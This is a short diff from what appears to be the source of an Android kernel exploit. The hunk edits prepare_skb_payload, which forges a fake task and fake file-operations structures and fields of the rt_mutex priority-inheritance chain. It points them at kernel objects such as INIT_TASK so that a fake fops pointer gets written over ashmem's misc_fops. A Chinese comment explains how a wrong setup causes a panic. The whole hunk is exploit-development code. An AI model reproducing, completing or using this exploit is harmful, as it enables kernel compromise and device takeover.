@@ -505,12 +505,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
      * rt_mutex_setprio 走 __task_rq_lock(fake_task) 直接 panic, 或使 PI
      * 链 walk 不进入 dequeue/W1, 假 fops 指针写不进 misc_fops -> step=4。 */
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = 0;
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
     write_pc = fake_fops;
-    write_right = data_addr(ASHMEM_MISC_FOPS);
-    write_left = 0;
+    write_right = 0;
+    write_left = canon_addr(ASHMEM_MISC_FOPS);
     waiter_task = text_addr(INIT_TASK);
     task_group = text_addr(ROOT_TASK_GROUP);
     pi_top_task = text_addr(INIT_TASK);
